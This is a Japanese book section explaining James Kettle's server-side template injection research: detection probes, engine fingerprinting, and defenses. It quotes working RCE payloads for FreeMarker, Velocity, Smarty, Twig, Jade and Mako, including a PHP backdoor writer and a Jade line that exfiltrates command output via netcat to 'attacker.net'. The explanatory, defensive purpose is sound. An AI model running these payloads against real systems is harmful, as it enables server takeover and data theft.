## James KettleのSSTI起点研究

SSTI（Server-Side Template Injection、サーバサイド・テンプレートインジェクション）という脆弱性クラスは、2015年に PortSwigger 社の James Kettle（現・Director of Research）が公開した一連の研究によって「体系化」された。それ以前にも「テンプレートにユーザ入力を混ぜると危ない」という散発的な事例報告はあったが、（1）どんなテンプレートエンジンでも共通に使える**検出手順**、（2）出力の違いから**エンジンを特定**する方法、（3）特定できたエンジンごとに**RCE（Remote Code Execution、遠隔任意コード実行）まで持っていく攻略の型**、という三段構えを最初に整理し、脆弱性クラスとして名前を与えたのがこの研究である。本節ではその起点論文と研究ハブの内容を、原典のペイロードを引用しながら、なぜそのペイロードが機能するのかという仕組みのレベルで解説する。

> ⚠️ 本節は防御・検出の理解を目的とする。掲載するペイロードは、自分が管理する検証環境や許可を得た対象でエンジンの挙動を確認するためのものであり、実在サービスや本番環境への無許可の検証・破壊的操作に用いてはならない。

---

### なぜ SSTI が「XSS の一歩先」なのか

多くの Web アプリは、テンプレートエンジンを使って動的な HTML やメール本文を組み立てる。テンプレートとは、`Hello {{name}}` のような「穴あきの文書」であり、エンジンが `{{name}}` の部分を実際の値で埋めて（レンダリングして）最終的な出力を作る。ここで重要なのは、**テンプレート言語はしばしば一種のプログラミング言語**だということだ。単なる変数展開だけでなく、メソッド呼び出し・オブジェクトのプロパティアクセス・算術演算・制御構文まで書けるものが多い。

SSTI は、この**テンプレートの本文（構文そのもの）をユーザが操作できてしまう**状態を指す。XSS（Cross-Site Scripting）は「ブラウザ上で JavaScript が動く」だけだが、SSTI は「サーバ上でテンプレートエンジンが式を評価する」ため、多くの場合そのままサーバ内部への攻撃、すなわちファイル読み書きや RCE に直結する。Kettle は論文冒頭でこの差を「XSS とは異なり、SSTI はサーバ内部を直接攻撃でき、しばしば RCE に至る」と明言している。

#### 脆弱性の二つの入り込み方

Kettle は、SSTI が生まれるパターンを二つに分類した。

**（1）意図的（intentional）にテンプレート編集を許すケース。** ユーザ自身にテンプレートを書かせる設計。原典の例は次の PHP コードである。

```php
$output = $twig->render($_GET['custom_email'],
    array("first_name" => $user.first_name));
```

`$twig->render()` の**第1引数はテンプレート本文**であり、それに `$_GET['custom_email']`（ユーザ入力）をそのまま渡している。マーケティング機能などで「メール文面をユーザにカスタマイズさせたい」という要件からこうした設計が生まれるが、テンプレート本文を渡された時点で、ユーザは Twig の全構文を注入できる。

**（2）偶発的（accidental）に構文が混ざるケース。** 開発者は変数を埋めているつもりなのに、ユーザ入力を**テンプレート文字列の連結**で組み立ててしまい、結果として入力中のテンプレート構文が評価されてしまう。Kettle はこれを「不完全なプリペアドステートメントにおける SQL インジェクションと等価」と表現している。つまり、SQLi が「クエリの構造にユーザ入力が混ざる」問題であるのと同型で、SSTI は「テンプレートの構造にユーザ入力が混ざる」問題なのだ、という洞察である。この対応関係が、検出手法（後述のプローブ注入）の発想の土台になっている。

### 検出：二つのコンテキストとプローブ・ペイロード

Kettle はまず、注入点が置かれる**コンテキスト（文脈）**を二種類に分けた。ここを取り違えると検出プローブの形が合わず、脆弱性を見逃す。

#### プレーンテキスト・コンテキスト（plaintext context）

ユーザ入力が、テンプレート出力の中に**そのまま平文として現れる**場合。HTML の一部として反射される、いわば XSS を探すときと同じ状況である。ここではテンプレート構文をまるごと注入して、それが評価されるかを見る。

```
smarty=Hello {user.name}
freemarker=Hello ${username}
```

上は、`Hello ` に続けて `{user.name}`（Smarty）や `${username}`（FreeMarker）という**構文を丸ごと**送り込めることを示す。

#### コード・コンテキスト（code context）

ユーザ入力が、テンプレート内の**変数の位置**にすでに埋め込まれている場合。例：

```
personal_greeting=username
```

これはテンプレート側が `Hello {personal_greeting}` のように書かれていて、`personal_greeting` の**値**として `username` が入る状況を表す。この場合、構文を丸ごと注入するのではなく、**今いる式の文脈を一度閉じてから**新しい構文を注ぐ必要がある。原典のプローブは次の形だ。

```
username}}<tag>
```

`username}}` で（`{{ ... }}` のような）現在の式を**閉じ**、その後ろに `<tag>` のような任意のマークアップや構文を続ける。閉じ括弧が効いて後続が新しい要素として解釈されれば、コード・コンテキストでの注入が成立している証拠になる。

#### 汎用プローブ：算術式で「評価されたか」を可視化する

SSTI 検出の核心は、**「文字列がそのまま返るか、計算結果が返るか」で評価の有無を判定する**という発想だ。Kettle が示した代表的なプローブは、エンジンごとの区切り記号を変えた算術式である。

```
${7*7}      （FreeMarker, Jinja2 などの ${...} / 一部の {{...}} 系）
{7*7}       （Smarty, Velocity など単一波括弧系）
{{7*7}}     （Twig など二重波括弧系）
```

原理はシンプルで強力だ。もし注入点が単なる文字列として扱われるなら、レスポンスにはそのまま `${7*7}` という文字列が返る。ところが**テンプレートエンジンがその区切りを認識して式として評価する**と、`49` が返る。`49` という「入力に含まれていないはずの計算結果」が出力に現れたら、それはエンジンがサーバ側で式を実行した動かぬ証拠になる。`7*7` を選ぶのは、`49` が偶然ページ内に存在しにくく、かつ多くの言語で共通に成立する単純な整数演算だからである。

なぜ複数の区切りを試すのか。テンプレートエンジンごとに式のデリミタが違うためだ。`{{...}}` は Twig/Jinja2 系、`${...}` は FreeMarker や JSP/EL 系、`{...}` は Smarty/Velocity 系、というように、**同じ `7*7` でも通る括弧が違う**。片方で反応がなくても、もう片方で `49` が返ることがある。だからこそ、この後の「エンジン特定」ステップへ自然につながる。

### エンジン特定：言語依存ペイロードの決定木

検出できたら次は「どのエンジンか」を突き止める。RCE の書き方はエンジンごとに全く違うため、この特定は必須の工程だ。Kettle はこれを**「言語依存ペイロードの決定木（a decision tree of language-specific payloads）」**として提示した。同一のプローブに対して**エンジンごとに異なる出力**を返す性質を利用し、成功／失敗の応答パターンを枝分かれ的にたどってエンジンを絞り込む。

最も有名な分岐が、**Twig と Jinja2 を見分ける文字列演算プローブ**である。

```
{{7*'7'}}
```

このプローブに対する挙動が両エンジンで割れる。

- **Twig（PHP）** は `49` を返す。Twig の演算子は PHP の緩い型変換に近い意味論を持ち、`'7'`（文字列）に対して掛け算をすると数値 `7` として扱われ、`7*7=49` になる。
- **Jinja2（Python）** は `7777777` を返す。Python では「文字列 × 整数」は**文字列の繰り返し**を意味する（`'7' * 7 == '7777777'`）。だからテンプレート側で `7 * '7'` が評価されると `7` を 7 回並べた `7777777` になる。

同じ `{{7*'7'}}` という一つのペイロードで、返り値が `49` か `7777777` かを見るだけで、背後の言語が PHP（Twig）か Python（Jinja2）かを一撃で切り分けられる。これは「テンプレート言語の型変換規則という内部実装の差」を観測に転用した、決定木の代表例である。この考え方——**同一入力に対する挙動差でエンジンを指紋採取する**——を各エンジンの特徴的構文（`${...}` が通るか、`<#assign>` が通るか、コメント構文 `{* *}` が効くか、等）に広げていくことで、決定木は網の目のように分岐していく。

> 補足（陳腐化対策）: これらの指紋の一部はエンジンのバージョンや設定に依存する。特に後述の RCE 系ペイロードは、エンジン側のセキュリティ修正（サンドボックス強化、危険クラスのブロックリスト追加）によって時期ごとに成否が変わる。実務では「対象エンジン名 + バージョン + 該当年のセキュリティ勧告」をセットで確認すること。

### 攻略の五段階手法（Detect → Identify → Exploit）

Kettle は SSTI の攻略を再現可能な手順に落とし込んだ。全体は五つのステップからなる。

1. **Detect（検出）**: 前述の算術プローブ等で、テンプレート注入が存在するかを確認する。
2. **Identify（特定）**: 決定木でエンジンを特定する。
3. **Exploit（攻略）** は、さらに三つに分かれる。
   - **Read（読む）**: 特定したエンジンの**公式ドキュメント、とりわけセキュリティ関連の章**を読み込む。何が式として書けるのか、どんな組み込みオブジェクトやメソッドが露出しているのかを把握する。SSTI 攻略の主戦場は「未知のバイナリを叩く」ことではなく「公開された言語仕様を読み解く」ことだ、という点がこの手法の肝である。
   - **Explore（探索）**: 実際にテンプレート内から到達可能なオブジェクト・メソッド・変数を列挙する。組み込みオブジェクト、グローバル変数、現在スコープから辿れるクラス階層などを調べ、「危険な機能への到達経路」を探す。
   - **Attack（攻撃）**: 探索で見つけた到達経路を使い、エンジン固有の実際のエクスプロイト（ファイル読み書き、コマンド実行など）を組み立てる。

この「Read→Explore→Attack」というループは、なぜ SSTI が強力かを説明している。テンプレートエンジンは**サーバサイドのサンドボックス**として設計されているが、そのサンドボックスから言語ランタイムの機能（リフレクション、標準ライブラリ、プロセス起動 API）へ**一本でも経路が通っていれば**、そこがサンドボックス破りの穴になる。攻略とは、その経路を仕様書と探索から見つけ出す作業に他ならない。

### エンジン別 RCE ペイロード（原典の実物）

以下は Kettle が起点論文で示した、エンジンごとの代表的な攻略ペイロードである。**それぞれ「なぜ動くのか」の原理を必ず添える**。掲載の目的は、これらの文字列が検出・防御時の指紋やブロック対象として理解できるようになることである。

#### FreeMarker（Java）

```
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
```

FreeMarker には `freemarker.template.utility.Execute` という**ユーティリティクラス**が存在する。このクラスは「入力を受け取ってシェルコマンドとして実行する」ために作られている。`<#assign ex=...?new()>` は FreeMarker の組み込みディレクティブ `<#assign>`（変数代入）と `?new()`（クラスをインスタンス化する組み込み）を組み合わせ、`Execute` クラスのインスタンスを変数 `ex` に束縛する。続く `${ ex("id") }` で `id` コマンドを実行し、その出力をテンプレート結果として吐き出す。つまり**エンジンが公式に用意した「コマンド実行用クラス」に到達できる**ことが、そのまま RCE になる。

#### Velocity（Java）

```
$class.inspect("java.lang.Runtime").type.getRuntime().exec("sleep 5")
```

Velocity では `ClassTool`（`$class`）の**リフレクション機能**が悪用される。`inspect("java.lang.Runtime")` で `java.lang.Runtime` クラスを取得し、`.type` で `Class` オブジェクトを得て、`getRuntime().exec(...)` で任意のプロセスを起動する。`sleep 5` を使っているのは、レスポンスが 5 秒遅延するかどうかで**盲目的（ブラインド）にコマンド実行の成否を判定**できるからだ（出力が画面に返らない状況でも時間差で確認できる）。Java のリフレクションは「クラス名の文字列から任意メソッドを呼べる」万能機構であり、それがテンプレートから触れると危険クラスへの到達経路になる、という典型例である。

#### Smarty（PHP）— 非サンドボックス

```
{php}echo `id`;{/php}
```

Smarty の `{php}...{/php}` タグは、囲んだ内容を**そのまま PHP コードとして実行**する。バッククォート `` `id` `` は PHP のシェル実行演算子で、`id` コマンドの出力を返す。テンプレート言語が「生の PHP を書ける機能」を提供している以上、そこにユーザ入力が届けば即 RCE となる。（このタグは後の Smarty で非推奨・削除の方向に進んだため、対象バージョンに依存する。）

#### Smarty（PHP）— セキュアモードのバイパス

```
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

Smarty のセキュアモードは `{php}` 等を封じるが、Kettle は**内部クラスの静的メソッド呼び出し**で回避できることを示した。`Smarty_Internal_Write_File::writeFile(...)` を呼び、`$SCRIPT_NAME`（実行中スクリプトのパス）に `<?php passthru($_GET['cmd']); ?>` という**PHP バックドア**を書き込む。以後は `?cmd=...` で任意コマンドを実行できる。サンドボックスが「危険なタグ」を塞いでも、「内部クラスの静的メソッド」という別経路が開いていれば破られる、という教訓である。

#### Twig（PHP）— 非サンドボックス

```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

Twig のテンプレートからは `_self`（現在のテンプレートオブジェクト）を通じて `env`（`Twig_Environment`）に到達できる。`registerUndefinedFilterCallback("exec")` は「未定義のフィルタが呼ばれたときのコールバック」に PHP の `exec` 関数を登録する。その状態で `getFilter("id")` を呼ぶと、`id` という未定義フィルタの解決時にコールバックの `exec("id")` が発火し、コマンドが実行される。**Environment オブジェクトに任意の PHP 関数をフィルタとして登録できる**というのが穴だ。

#### Twig（PHP）— サンドボックスのバイパス

```
{{_self.displayBlock("id",[],{"id":[userObject,"vulnerableMethod"]})}}
```

Twig のサンドボックス（`SecurityPolicy`）は関数のホワイトリストで守るが、**`_self` オブジェクトは任意のメソッドを呼べるという例外**があった。この例外を突いて `displayBlock` を悪用し、`userObject` の `vulnerableMethod`（アプリ側が持つ危険なメソッド等）を関数ホワイトリストを迂回して呼び出す。サンドボックスの「例外的に信頼される内部オブジェクト」が、そのまま抜け穴になるという構図である。

#### Jade（Node.js）

```
- var x = root.process.mainModule.require
- x = x('child_process')
= x.exec('id | nc attacker.net 80')
```

Jade（現 Pug）では、グローバルの `root` オブジェクトから `process.mainModule.require` を辿り、Node.js の `require` 関数を掴む。それで `child_process` モジュールを読み込み、`exec` で `id` を実行、結果を `nc`（netcat）で外部へ送っている。**グローバルオブジェクト → process → require → 危険モジュール**というプロパティ連鎖でサンドボックスの外（Node ランタイムの全機能）へ到達する、JavaScript 系 SSTI の典型パターンだ。

> ⚠️ 上記の `nc attacker.net 80` のように外部へデータを送出する手順は、無許可の対象で行えばデータ持ち出しに当たる。原典の記述としてメカニズムを示すが、検証は自分が管理する隔離環境に限ること。

#### Mako（Python）

```
<% import os; x=os.popen('id').read() %>${x}
```

Mako は `<% ... %>` の中に**生の Python 文**を書ける。`import os` で標準ライブラリを取り込み、`os.popen('id').read()` でコマンド出力を得て、`${x}` で表示する。テンプレートが Python 実行環境をそのまま露出しているため、防壁が事実上存在しない。

### 影響と防御

#### 影響（原典より）

- 任意のファイル読み書き
- 露出したクラス・リフレクション経由の RCE
- 管理者専用メソッドの呼び出しによる権限昇格
- 蓄積型 XSS と組み合わせた不正なバックドア設置
- 環境変数アクセスによる情報漏えい（認証情報・秘密鍵など）

要するに SSTI は、単独でサーバ乗っ取りに至りうる高深刻度の脆弱性であり、他の脆弱性（保存型 XSS 等）と連鎖するとさらに被害が拡大する。

#### 防御（原典より）

Kettle が挙げた対策は、**「そもそもユーザにテンプレートを書かせない」を最優先とし、どうしても必要なら多層に閉じ込める**という方針である。

1. **ロジックを持たないテンプレートエンジンを使う**。ユーザ入力をテンプレートに関わらせる場合は、Mustache や Python の `string.Template` のような**式評価能力のない**単純なエンジンを選ぶ。演算やメソッド呼び出しができなければ、RCE の足場そのものが無い。
2. **サンドボックス化された実行環境**（Lua、Docker コンテナ等）でレンダリングを隔離する。
3. **ケーパビリティの剥奪と読み取り専用ファイルシステム**を適用し、万一の突破時の被害を限定する。
4. **信頼できないユーザにテンプレート編集を許さない**。本当に不可欠でない限り、テンプレート編集機能そのものを露出しない。
5. **デプロイ前にセキュリティ観点のドキュメントレビュー**を行う。

原典は重要な原則を一文で述べている——**「テンプレートエンジンはサーバサイドのサンドボックスである」**。そして、たとえサンドボックスを謳うエンジンであっても、信頼できないユーザにテンプレート編集を許すこと自体が「重大なリスク」を持ち込む、と結論づけている。Twig・Smarty のサンドボックス・バイパス例が示すとおり、サンドボックスは「破られうる境界」であって「破れない壁」ではない。だからこそ、第一の防御は「サンドボックスを固くする」ことではなく「信頼できない入力をテンプレート構文の位置に置かない」ことなのだ。

> 出典: Server-Side Template Injection（James Kettle, 2015年8月5日公開／2025年9月3日更新） — https://portswigger.net/research/server-side-template-injection

### 研究ハブ：SSTI/CSTI 研究群の位置づけ

PortSwigger の Template Injection 研究ハブは、この分野の資料を「サーバサイド（SSTI）」と「クライアントサイド（CSTI）」に整理して束ねるページである。

- **SSTI**: 2015年に PortSwigger が体系化した技術として、エンジンの検出手法・エンジン別攻略・実習ラボ（Web Security Academy）が紹介される。象徴的な発表が Black Hat USA での **"Server-Side Template Injection: RCE for the Modern Webapp"** である。
- **CSTI（Client-Side Template Injection）**: ブラウザ内、特に AngularJS のような JavaScript フレームワークで、ユーザ入力がテンプレート式を定義できてしまう問題。攻撃者は簡略化された JavaScript を注入でき、影響は XSS に近い。ハブでは AngularJS の**サンドボックス・エスケープ**、実アプリでの悪用、**CSP（Content Security Policy）バイパス**、2017年 BSides Manchester の **"DOM Based Angular Sandbox Escapes"** などが扱われる。
- **登場する研究者**: James Kettle、Gareth Heyes、Zakhar Fedotkin、Tom Stacey。SSTI/CSTI が単発の発見ではなく、複数の研究者による継続的な研究テーマとして育っていることが分かる。

CSTI と SSTI を並置しているのは、両者が「テンプレート式の位置にユーザ入力が届く」という同じ根を持ちながら、実行される場所（ブラウザかサーバか）と最終的な影響（XSS 相当か RCE か）が異なる、という対比を示すためである。本書が扱う「安全でないデシリアライゼーション + SSTI = RCE」という主題においては、SSTI 側が RCE への主要な一本道であり、Kettle のこの起点研究がその地図の原点になっている。

> 出典: Template Injection（PortSwigger Research ハブ） — https://portswigger.net/research/template-injection

### 本節のまとめ

- SSTI は「テンプレート本文（構文）にユーザ入力が混ざる」脆弱性であり、SQLi と同型の問題として理解できる。テンプレート言語はしばしば実行能力を持つため、XSS と違ってサーバ側 RCE に直結する。
- Kettle の起点研究は **Detect → Identify → Exploit（Read→Explore→Attack）** の五段階手法を確立した。検出は `${7*7}` / `{7*7}` / `{{7*7}}` の算術プローブで「計算結果 `49` が返るか」を見る。
- エンジン特定は「同一入力への挙動差」で指紋採取する。`{{7*'7'}}` が `49`（Twig／PHP の型変換）か `7777777`（Jinja2／Python の文字列反復）かで PHP 系と Python 系を切り分けられる。
- RCE は各エンジンが露出する「言語ランタイムへの経路」（FreeMarker の Execute、Velocity/Java のリフレクション、Jade/Node の require 連鎖、Smarty/Mako の生コード実行）を突く。サンドボックスは Twig・Smarty のバイパス例が示すとおり破られうる。
- ゆえに最優先の防御は「サンドボックスを固くする」ことではなく、**ロジックを持たないエンジンを選び、信頼できない入力をテンプレート構文の位置に置かない**ことである。
